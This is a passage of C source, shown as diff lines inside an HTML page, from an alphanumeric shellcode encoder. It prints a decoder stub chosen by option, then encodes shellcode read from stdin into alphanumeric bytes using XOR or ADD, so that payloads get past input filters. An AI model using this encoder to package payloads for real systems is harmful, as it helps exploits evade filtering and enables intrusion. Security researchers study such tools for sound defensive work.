+     printf(&quot;\n&quot;);
+     exit(EXIT_SUCCESS);
+   }
+ 
+
+  if (uppercase) {
+     if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+     else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+   } else {
+     if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;
+     else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;
+   }
+ 
+  // Find and output decoder
+   for (i=0; strcasecmp(baseaddress, decoders[options][i].id) != 0; i++) {
+     if (decoders[options][i+1].id == NULL) {
+       fprintf(stderr, &quot;%s: unrecognized baseaddress option `%s&#34;\n&quot;
+                       &quot;Try `%s %s%s--sources&#34; for a list of BASEADDRESS options.\n&quot;,
+                       argv[0], baseaddress, argv[0],
+                       uppercase ? &quot;--uppercase &quot; : &quot;&quot;,
+                       unicode ? &quot;--unicode &quot; : &quot;&quot;);
+       exit(EXIT_FAILURE);
+     }
+   }
+   printf(&quot;%s&quot;, decoders[options][i].code);
+ 
+  // read, encode and output shellcode
+   while ((input = getchar()) != EOF) {
+     // encoding AB -&gt; CD 00 EF 00
+     A = (input &amp; 0xf0) &gt;&gt; 4;
+     B = (input &amp; 0x0f);
+ 
+    F = B;
+     // E is arbitrary as long as EF is a valid character
+     i = rand() % strlen(valid_chars);
+     while ((valid_chars[i] &amp; 0x0f) != F) { i = ++i % strlen(valid_chars); }
+     E = valid_chars[i] &gt;&gt; 4;
+     // normal code uses xor, unicode-proof uses ADD.
+     // AB -&gt;
+     D =  unicode ? (A-E) &amp; 0x0f : (A^E);
+     // C is arbitrary as long as CD is a valid character
+     i = rand() % strlen(valid_chars);
+     while ((valid_chars[i] &amp; 0x0f) != D) { i = ++i % strlen(valid_chars); }
+     C = valid_chars[i] &gt;&gt; 4;
+     printf(&quot;%c%c&quot;, (C&lt;&lt;4)+D, (E&lt;&lt;4)+F);
+   }
+   printf(&quot;A%s&quot;, nonewline ? &quot;&quot; : &quot;\n&quot;); // Terminating &quot;A&quot;
+ 
+  exit(EXIT_SUCCESS);
+ }
+
+
+ -EOF-
+</pre>
+</body>
+</html>
